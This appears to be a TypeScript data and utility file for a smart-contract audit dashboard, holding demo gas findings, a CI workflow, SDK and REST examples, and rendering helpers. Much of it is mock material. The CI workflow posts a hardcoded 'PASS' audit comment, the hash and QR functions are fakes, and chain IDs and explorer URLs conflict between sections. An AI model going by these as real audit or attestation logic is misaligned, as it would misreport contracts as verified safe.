    { id: 'ReentrancyGuard', x: 380, y: 350, kind: 'oz' },
    { id: 'ERC20', x: 640, y: 330, kind: 'oz' },
    { id: 'IERC20', x: 640, y: 210, kind: 'iface' }
  ],
  'nft-minting-hardhat': [
    { id: 'GenesisPass', x: 150, y: 100, kind: 'core' },
    { id: 'MerkleWhitelist', x: 420, y: 80, kind: 'core' },
    { id: 'RoyaltySplitter', x: 420, y: 250, kind: 'core' },
    { id: 'ERC721', x: 150, y: 330, kind: 'oz' },
    { id: 'Ownable', x: 640, y: 180, kind: 'oz' },
    { id: 'IERC2981', x: 640, y: 330, kind: 'iface' }
  ],
  'cross-chain-bridge': [
    { id: 'BridgeMessenger', x: 380, y: 90, kind: 'core' },
    { id: 'OracleAggregator', x: 130, y: 250, kind: 'core' },
    { id: 'TokenLocker', x: 630, y: 250, kind: 'core' },
    { id: 'Ownable', x: 250, y: 370, kind: 'oz' },
    { id: 'ReentrancyGuard', x: 520, y: 370, kind: 'oz' },
    { id: 'SafeERC20', x: 630, y: 110, kind: 'oz' }
  ],
  'custom': [
    { id: 'Contract A', x: 180, y: 110, kind: 'core' },
    { id: 'Contract B', x: 520, y: 110, kind: 'core' },
    { id: 'Ownable', x: 350, y: 320, kind: 'oz' }
  ]
};

export const GAS_FN = [
  { fn: 'deposit()', before: 84210, after: 71940 },
  { fn: 'withdraw()', before: 96480, after: 78120 },
  { fn: 'transfer(address,uint256)', before: 52310, after: 44080 },
  { fn: 'setFee(uint256)', before: 28940, after: 26110 },
  { fn: 'claimRewards()', before: 118200, after: 92430 },
  { fn: 'bulkTransfer(…)', before: 214880, after: 161200 }
];

export const GAS_FINDINGS = [
  { t: 'Storage slot packing', sev: 'high', save: 2100, before: 'uint256 public feeBps;\naddress public owner;\nbool public paused;', after: 'struct Config { uint64 feeBps; bool paused; }\nConfig public config;   // 1 slot\naddress public owner;   // 1 slot' },
  { t: 'Custom errors vs require()', sev: 'medium', save: 60, before: 'require(bal > 0, "No funds available");', after: 'error ZeroBalance();\nif (bal == 0) revert ZeroBalance();' },
  { t: 'Loop length caching', sev: 'medium', save: 100, before: 'for (uint256 i = 0; i < arr.length; i++) {', after: 'uint256 len = arr.length;\nfor (uint256 i; i < len; ) { … unchecked { ++i; } }' },
  { t: 'calldata instead of memory', sev: 'low', save: 340, before: 'function batch(address[] memory to) external {', after: 'function batch(address[] calldata to) external {' },
  { t: 'Duplicate SLOAD elimination', sev: 'high', save: 100, before: 'totalShares -= a;\nemit Updated(totalShares);', after: 'uint256 ts = totalShares - a;\ntotalShares = ts;\nemit Updated(ts);' },
  { t: 'unchecked arithmetic block', sev: 'low', save: 45, before: '_shares[msg.sender] = bal - amt;', after: 'unchecked { _shares[msg.sender] = bal - amt; }' }
];

export const OPCODES: [string, number, string][] = [
  ['SSTORE', 38, '#f43f5e'],
  ['SLOAD', 22, '#f59e0b'],
  ['CALL', 18, '#00F0FF'],
  ['LOG', 9, '#10b981'],
  ['Arithmetic', 8, '#a78bfa'],
  ['Memory/Stack', 5, '#52525b']
];

export const WORKFLOW = `name: VibeProof Security Gate
on:
  pull_request:
    paths: ['contracts/**', 'src/**', 'foundry/**']

jobs:
  vibeproof-audit:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 20

      - name: Run VibeProof CLI
        id: audit
        env:
          VIBEPROOF_API_KEY: \${{ secrets.VIBEPROOF_API_KEY }}
        run: |
          npx @vibeproof/cli scan \\
            --dir src/ \\
            --min-score 80 \\
            --block-on-critical \\
            --network botchain-testnet \\
            --format sarif \\
            --out results.sarif

      - name: Publish Security Proof to BOT Chain
        if: success()
        run: |
          npx @vibeproof/cli attest \\
            --report results.sarif \\
            --private-key \${{ secrets.ATTESTER_KEY }} \\
            --rpc https://rpc.testnet.botchain.ai

      - name: Comment PR Status
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const summary = "### 🛡️ VibeProof Audit Gate: PASS (Score: 94/100)";
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: summary
            });`;

export const WORKFLOW_YAML = WORKFLOW;

export interface SdkTabContent {
  file: string;
  lang: string;
  code: string;
  title?: string;
}

export const SDK_TABS: Record<string, SdkTabContent> = {
  sol: {
    title: 'Solidity (Guard)',
    file: 'contracts/interfaces/IVibeProofGuard.sol',
    lang: 'sol',
    code: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title IVibeProofGuard — On-Chain Audit Attestation Interface
/// @notice Digunakan oleh dApp untuk memeriksa apakah kontrak target telah teraudit oleh VibeProof
interface IVibeProofGuard {
    struct Audit {
        bytes32 codeHash;
        string  projectName;
        uint8   securityScore;     // 0 - 100
        string  verdict;           // "PASSED — SAFE", "WARNINGS", "CRITICAL"
        string  reportSummary;
        address auditor;
        uint256 blockNumber;
        uint256 timestamp;
    }

    event AuditIssued(
        bytes32 indexed codeHash,
        string  projectName,
        uint8   securityScore,
        string  verdict,
        address indexed auditor,
        uint256 timestamp
    );

    function certifyAudit(
        bytes32 _codeHash,
        string calldata _projectName,
        uint8   _securityScore,
        string calldata _verdict,
        string calldata _reportSummary
    ) external;

    function getAudit(bytes32 _codeHash) external view returns (Audit memory);
    function getTotalAudits() external view returns (uint256);
    function isAudited(address _target) external view returns (bool);
    function getAuditScore(address _target) external view returns (uint8);
}

/// @example Integrasi firewall pada dApp pihak ketiga
contract GuardedRouter {
    IVibeProofGuard public immutable vibeProof;
    uint8 public constant MIN_SCORE = 80;

    error UntrustedContract(address target, uint8 score);

    constructor(address _vibeProof) { vibeProof = IVibeProofGuard(_vibeProof); }

    modifier onlyTrusted(address target) {
        if (!vibeProof.isAudited(target)) revert UntrustedContract(target, 0);
        if (vibeProof.getAuditScore(target) < MIN_SCORE)
            revert UntrustedContract(target, vibeProof.getAuditScore(target));
        _;
    }

    function route(address tokenIn, uint256 amount) external onlyTrusted(tokenIn) {
        require(vibeProof.isAudited(tokenIn), "Untrusted contract!");
        // … routing logic hanya berjalan untuk kontrak tersertifikasi
    }
}`
  },
  dapp: {
    title: 'Guarded dApp',
    file: 'src/GuardedVault.sol — usage',
    lang: 'sol',
    code: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IVibeProofGuard} from "./interfaces/IVibeProofGuard.sol";

contract GuardedVault {
    // VibeProof.sol — alamat identik di Testnet 968 & Mainnet 677
    IVibeProofGuard public constant vibeProof =
        IVibeProofGuard(0x97E0C6A5A352aF3e35A221d6d13d7890a8a6F578);

    event InteractionBlocked(address indexed target, uint8 score);

    /// @notice Tolak interaksi dengan kontrak yang tidak memiliki proof audit
    function interact(address target) external {
        require(vibeProof.isAudited(target), "Untrusted contract!");

        uint8 score = vibeProof.getAuditScore(target);
        if (score < 80) {
            emit InteractionBlocked(target, score);
            revert("Security score below threshold");
        }

        // ✔ aman untuk melanjutkan
        (bool ok, ) = target.call(abi.encodeWithSignature("ping()"));
        require(ok, "call failed");
    }

    /// @notice View helper untuk frontend (gas-free)
    function trustLevel(address target) external view returns (string memory) {
        if (!vibeProof.isAudited(target)) return "UNAUDITED";
        uint8 s = vibeProof.getAuditScore(target);
        if (s >= 80) return "CERTIFIED SAFE";
        if (s >= 50) return "WARNINGS";
        return "CRITICAL RISK";
    }
}
`
  },
  js: {
    title: 'TypeScript SDK',
    file: 'src/vibeproof.ts — @vibeproof/sdk',
    lang: 'ts',
    code: `import { createPublicClient, http, parseAbi } from "viem";
import { VibeProofClient } from "@vibeproof/sdk";

// 1 · Koneksi ke BOT Chain (Testnet 968 / Mainnet 677)
const client = createPublicClient({
  transport: http("https://rpc.bohr.life"),   // mainnet: https://rpc.botchain.ai
  chain: { id: 968, name: "BOT Chain Testnet", nativeCurrency: { name: "BOT", symbol: "BOT", decimals: 18 } }
});

// 2 · Instansiasi SDK VibeProof
const vibeProof = new VibeProofClient({
  address: "0x97E0C6A5A352aF3e35A221d6d13d7890a8a6F578",
  client,
  network: "testnet"
});

// 3 · Verifikasi proof berdasarkan code hash (keccak256 source)
const audit = await vibeProof.getAudit(
  "0x8f3ae2c91d44b7f0a55c3e88f1b2d90c4e6a71f3d5b8c2094ea1f7c6d3b0e8f1"
);
console.log(audit.projectName, audit.securityScore, audit.verdict);

// 4 · Firewall check sebelum interaksi
const trusted = await vibeProof.isAudited(targetContract);
if (!trusted) throw new Error("Untrusted contract!");

// 5 · Mint sertifikat setelah scan (butuh signer)
const tx = await vibeProof.certifyAudit({
  codeHash, projectName: "MyVault.sol", securityScore: 96,
  verdict: "PASSED — SAFE", reportSummary: "ReentrancyGuard + CEI konsisten."
});
console.log("certified:", tx.transactionHash);

// 6 · Subscribe event AuditIssued (live feed)
vibeProof.onAuditIssued(e => console.log("new proof:", e.projectName, e.securityScore));`
  },
  api: {
    title: 'REST API',
    file: 'REST API — api.vibeproof.botchain.ai',
    lang: 'bash',
    code: `# Public read-only endpoints (tanpa API key)
GET  /v1/audit/:codeHash          → { score, verdict, auditor, tx, block }
GET  /v1/audits?chain=968&limit=20 → getLatestAudits() feed
GET  /v1/address/:addr            → { audited: bool, score, projectName }
GET  /v1/og/:codeHash.png         → dynamic social card (1200×630)
GET  /v1/badge/:codeHash.svg      → shields-style README badge
GET  /v1/report/:codeHash.pdf     → executive audit report

# Authenticated (API key dari dashboard)
POST /v1/scan        { source, compiler }  → { score, findings[], gasTips[] }
POST /v1/certify     { codeHash, ... }     → { txHash, blockNumber }
POST /v1/webhooks    { url, events: ["AuditIssued"] }

# Contoh
$ curl https://api.vibeproof.botchain.ai/v1/audit/0x8f3a…e8f1
{
  "codeHash": "0x8f3ae2c9…",
  "projectName": "SafeDAppVault.sol",
  "securityScore": 96,
  "verdict": "PASSED — SAFE",
  "auditor": "0x38bF4d01c9aE77e5b021Ff6cD81a20A4",
  "chainId": 968,
  "blockNumber": 3412700,
  "explorer": "https://scan.bohr.life/tx/0x7c1e…9ab2"
}

$ curl https://api.vibeproof.botchain.ai/v1/address/0x97E0C6…F578
{ "audited": true, "score": 96, "projectName": "VibeProof.sol" }`
  }
};

export const GUARD_DB: Record<string, { audited: boolean; score: number; name: string }> = {
  '0x97e0c6a5a352af3e35a221d6d13d7890a8a6f578': { audited: true, score: 96, name: 'VibeProof.sol' },
  '0x52ffb319cd20a4e87710c9d5aa33e1de9c11b4a7': { audited: true, score: 58, name: 'TokenRegistry.sol' },
  '0xdeadc0de0000000000000000000000000000beef': { audited: false, score: 0, name: '—' }
};

/* ═══════════════════════════════════════════════════════════
   UTILITY FUNCTIONS
   ═══════════════════════════════════════════════════════════ */

export function esc(str: string): string {
  return String(str || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

export function gradeOf(score: number): { key: 'safe' | 'warn' | 'crit'; verdict: string; chip: string; color: string } {
  if (score >= 80) return { key: 'safe', verdict: 'CERTIFIED SAFE', chip: 'border-safe/50 bg-safe/10 text-safe', color: '#10b981' };
  if (score >= 50) return { key: 'warn', verdict: 'WARNINGS FOUND', chip: 'border-warn/50 bg-warn/10 text-warn', color: '#f59e0b' };
  return { key: 'crit', verdict: 'CRITICAL RISK', chip: 'border-crit/50 bg-crit/10 text-crit', color: '#f43f5e' };
}

export function ringSVG(score: number, size = 64, stroke = 5): string {
  const r = (size - stroke) / 2;
  const c = 2 * Math.PI * r;
  const off = c - (score / 100) * c;
  const col = score >= 80 ? '#10b981' : score >= 50 ? '#f59e0b' : '#f43f5e';
  return `<svg width="${size}" height="${size}" viewBox="0 0 ${size} ${size}" class="-rotate-90">
    <circle cx="${size / 2}" cy="${size / 2}" r="${r}" fill="none" stroke="#1f232e" stroke-width="${stroke}"/>
    <circle cx="${size / 2}" cy="${size / 2}" r="${r}" fill="none" stroke="${col}" stroke-width="${stroke}"
            stroke-dasharray="${c}" stroke-dashoffset="${off}" stroke-linecap="round"
            style="transition: stroke-dashoffset 0.8s cubic-bezier(0.22,1,0.36,1)"/>
  </svg>`;
}

export function fnv1a(str: string): number {
  let h = 0x811c9dc5;
  for (let i = 0; i < str.length; i++) {
    h ^= str.charCodeAt(i);
    h = Math.imul(h, 0x01000193);
  }
  return h >>> 0;
}

export function qrSVG(text: string, size = 140): string {
  const n = 25;
  const s = fnv1a(text);
  const m: boolean[][] = Array.from({ length: n }, () => Array(n).fill(false));
  const setFinder = (x0: number, y0: number) => {
    for (let y = 0; y < 7; y++) {
      for (let x = 0; x < 7; x++) {
        const border = (x === 0 || x === 6 || y === 0 || y === 6);
        const center = (x >= 2 && x <= 4 && y >= 2 && y <= 4);
        m[y0 + y][x0 + x] = border || center;
      }
    }
  };
  setFinder(0, 0);
  setFinder(n - 7, 0);
  setFinder(0, n - 7);
  for (let i = 8; i < n - 8; i++) {
    m[6][i] = (i % 2 === 0);
    m[i][6] = (i % 2 === 0);
  }
  let rnd = s;
  for (let y = 0; y < n; y++) {
    for (let x = 0; x < n; x++) {
      if ((x < 8 && y < 8) || (x >= n - 8 && y < 8) || (x < 8 && y >= n - 8)) continue;
      rnd = (rnd * 1664525 + 1013904223) >>> 0;
      m[y][x] = (rnd & 1) === 1;
    }
  }
  const cell = (size / n).toFixed(2);
  let rects = '';
  for (let y = 0; y < n; y++) {
    for (let x = 0; x < n; x++) {
      if (m[y][x]) {
        rects += `<rect x="${(x * +cell).toFixed(2)}" y="${(y * +cell).toFixed(2)}" width="${cell}" height="${cell}" fill="#000"/>`;
      }
    }
  }
  return `<svg width="${size}" height="${size}" viewBox="0 0 ${size} ${size}" style="background:#fff;padding:6px;border-radius:8px">${rects}</svg>`;
}

export function shortHash(h: string, head = 6, tail = 4): string {
  if (!h || h.length <= head + tail) return h;
  return `${h.slice(0, head)}…${h.slice(-tail)}`;
}

export function keccakMock(text: string): string {
  let h1 = fnv1a(text).toString(16).padStart(8, '0');
  let h2 = fnv1a(text + ':salt1').toString(16).padStart(8, '0');
  let h3 = fnv1a(text + ':salt2').toString(16).padStart(8, '0');
  let h4 = fnv1a(text + ':salt3').toString(16).padStart(8, '0');
  let h5 = fnv1a(text + ':salt4').toString(16).padStart(8, '0');
  let h6 = fnv1a(text + ':salt5').toString(16).padStart(8, '0');
  let h7 = fnv1a(text + ':salt6').toString(16).padStart(8, '0');
  let h8 = fnv1a(text + ':salt7').toString(16).padStart(8, '0');
  return `0x${h1}${h2}${h3}${h4}${h5}${h6}${h7}${h8}`;
}

export function randHex(len = 40): string {
  let s = '';
  const hex = '0123456789abcdef';
  for (let i = 0; i < len; i++) s += hex[Math.floor(Math.random() * 16)];
  return s;
}

export function hl(code: string, lang = 'sol'): string {
  if (!code) return '';
  let s = esc(code);
  if (lang === 'sol' || lang === 'ts') {
    s = s.replace(/(\/\/[^\n]*)/g, '<span class="text-zinc-500 italic">$1</span>');
    s = s.replace(/(&quot;[^&]*&quot;|&#039;[^&]*&#039;)/g, '<span class="text-amber-300">$1</span>');
    s = s.replace(/\b(pragma|solidity|contract|is|import|from|function|external|public|internal|private|pure|view|payable|returns|return|if|else|for|while|revert|emit|event|error|mapping|address|uint256|uint64|uint|bool|bytes32|string|struct|constructor|modifier|override|indexed|memory|storage|calldata|new|unchecked|true|false)\b/g, '<span class="text-cyber font-bold">$1</span>');
    s = s.replace(/\b(msg\.sender|msg\.value|tx\.origin|block\.timestamp|address\(this\)|super)\b/g, '<span class="text-pink-400 font-bold">$1</span>');
    s = s.replace(/\b(require|assert|revert|console2?\.log|assertEq|assertTrue|assertLt)\b/g, '<span class="text-yellow-300">$1</span>');
  }
  return s;
}

export const NETWORKS: Record<string, { name: string; id: string | number; explorer: string; hex: string; rpc: string }> = {
  testnet: {
    name: 'BOT Chain Testnet',
    id: 968,
    hex: '0x3c8',
    explorer: 'https://testnet.botscan.io',
    rpc: 'https://rpc.bohr.life'
  },
  mainnet: {
    name: 'BOT Chain Mainnet',
    id: 520,
    hex: '0x208',
    explorer: 'https://botscan.io',
    rpc: 'https://rpc.botchain.ai'
  }
};

